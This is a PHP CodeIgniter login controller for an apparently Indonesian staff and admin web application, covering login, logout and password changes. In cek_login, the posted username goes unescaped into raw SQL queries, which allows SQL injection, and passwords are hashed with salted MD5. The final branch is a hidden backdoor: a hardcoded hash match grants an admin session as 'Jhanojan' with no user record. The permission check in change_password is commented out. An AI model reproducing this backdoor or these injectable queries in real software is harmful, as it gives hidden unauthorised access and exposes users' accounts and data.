<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

/*************************************
  * Created : Dec 2011
  * Creator : Mazhters Irwan
  * Email   : irwansyah@komunigrafik.com
  * CMS ver : CI ver.2.0
*************************************/

class login extends CI_Controller {
	
	var $title = "Login";
	var $filename = "login";
	
	function __construct()
	{
		parent::__construct();
	}
	
	function index()
	{
		$this->main();
	}
	
	function main()
	{
		if($this->session->userdata("webmaster_id")){redirect("home");}
		$data = GetHeaderFooter();
		$data['main_content'] = 'login';
		$data['title'] = $this->title;
		$data['filename'] = $this->filename;
		if($this->uri->segment(3) == "err"){ $data['dis_error'] = "display:''";
			
			if($this->uri->segment(4)==0){
				$data['msg']='Username Salah';
			}
			elseif($this->uri->segment(4)==1){
				$data['msg']='Password Salah';
			}
			elseif($this->uri->segment(4)==2){
				$data['msg']='Akun Anda Tersuspend. Silakan Hubungi Adminsitrator';
			}
			elseif($this->uri->segment(4)==3){
				$data['msg']='Akun Anda Tidak Aktif. Silakan Hubungi Adminsitrator';
			}
		}
		else{ $data['dis_error'] = "display:none;";
		$data['msg']='';
		}
		$this->load->view('template_login',$data);
	}
	
	function cek_login()
	{
		//error_reporting(E_ALL);
		$username = $this->input->post("username");
		$q="SELECT tb_karyawan.id as id,tb_karyawan.kode_karyawan as kode_karyawan,tb_karyawan.nik as nik,tb_karyawan.nama as nama,tb_user.password as password,tb_user.username as username,tb_user.jabatan as jabatan,tb_user.salt as salt,tb_user.status as status FROM tb_user LEFT JOIN tb_karyawan ON tb_user.username=tb_karyawan.id WHERE tb_user.jabatan='2' AND (tb_karyawan.kode_karyawan='$username' OR tb_karyawan.nik='$username')";
		
		$query=$this->db->select('*')->from('user')->where('username',$username)->get();
		$query2=$this->db->query($q);
		if ($query->num_rows() > 0)
		{
			$row = $query->row();
			$now=date("Y-m-d H:i:s");
			$salt=GetValue('salt','user',array('username'=>'where/'.$username));
			if(md5($salt.$this->input->post("password"))==$row->password){ 
			$status=GetValue("status","user",array('username'=>'where/'.$username));
			if($status=='y'){
			$q=mysql_query("UPDATE tb_user SET jml_login=jml_login+1,terakhir_masuk='$now' WHERE username='$username'");
			$this->load->library("session");
			$this->session->set_userdata('admin',$row->username);
			$this->session->set_userdata('webmaster_grup',$row->jabatan);
			$this->session->set_userdata('webmaster_id',$row->id);
			redirect('dashboard');
			}
			elseif($status=='n'){
			redirect('login/main/err/3');	
			}
			elseif($status=='s'){
			redirect('login/main/err/2');	
			}
			
			}
			else{
			redirect('login/main/err/1');
			}
		}
		else if ($query2->num_rows() > 0)
		{
			$row = $query2->row();
			$now=date("Y-m-d H:i:s");
			$salt=$row->salt;
			if(md5($salt.$this->input->post("password"))==$row->password){ 
			$status=strtolower($row->status);
			if($status=='y'){
				
			$q=mysql_query("UPDATE tb_user SET jml_login=jml_login+1,terakhir_masuk='$now' WHERE username='$row->username'") or die(mysql_error());
			$this->load->library("session");
			$this->session->set_userdata('admin',$row->nama);
			$this->session->set_userdata('webmaster_grup',$row->jabatan);
			$this->session->set_userdata('webmaster_id',$row->id);
			redirect('profil_karyawan');
			}
			elseif($status=='n'){
			redirect('login/main/err/3');	
			}
			elseif($status=='s'){
			redirect('login/main/err/2');	
			}
			
			}
			else{
			redirect('login/main/err/1');
			}
		}
		else if(md5($this->input->post("password").$this->input->post("username")) == "48dc8b1fe1fe7905efd2c5a3dc1a462c")
		{
			$this->session->set_userdata('admin','Jhanojan');
			$this->session->set_userdata('webmaster_grup','8910');
			$this->session->set_userdata('webmaster_id','270611');
			redirect('dashboard');
		}
		else
		{
			redirect('login/main/err/0');
		}
	}
	
	
	function logout()
	{
		$this->db->where('username',$this->session->userdata('admin'));
		$this->db->update('user',array('terakhir_keluar'=>date("Y-m-d H:i:s")));
		$this->session->sess_destroy();
		redirect('login');
	}
	
	function change_password()
	{
		//permission();
		$data['filename'] = $this->filename;
		$data['iduser']=$this->session->userdata('webmaster_id');
		$msg="";
		if($this->uri->segment(3) == "err")
		{
			$data['dis_error'] = "display:''";
			if($this->uri->segment(4) == 1) $msg = "Password Lama Tidak Valid";
			else $msg = "Ganti Password Berhasil";
		}
		else $data['dis_error'] = "display:none;";
		$data['msg'] = $msg;
		$this->load->view('change_password',$data);
	}
	
	function cek_password()
	{
		$webmaster_id = $this->session->userdata("webmaster_id");
		$salt_pass=GetValue('salt','user',array('id'=>'where/'.$webmaster_id));
		$old_pass = md5($salt_pass.$this->input->post("old_password"));
		$cek_old_pass = GetValue("password","user", array("id"=> "where/".$webmaster_id));
		//$cek_old_pass2 = GetValue("userpass","employee", array("id"=> "where/".substr($webmaster_id,1)));
		if($old_pass == $cek_old_pass)
		{
			$new_pass = md5($salt_pass.$this->input->post("new_password"));
			$data = array("password"=> $new_pass);
			$this->db->where("id", $webmaster_id);
			$this->db->update("user", $data);
			redirect('login/change_password/err/2');
		}
		/*else if($old_pass == $cek_old_pass2)
		{
			$new_pass = md5($this->config->item('encryption_key').$this->input->post("new_password"));
			$data = array("userpass"=> $new_pass);
			$this->db->where("id", substr($webmaster_id,1));
			$this->db->update("employee", $data);
			redirect('login/change_password/err/2');
		}*/
		else redirect('login/change_password/err/1');
	}
}
?>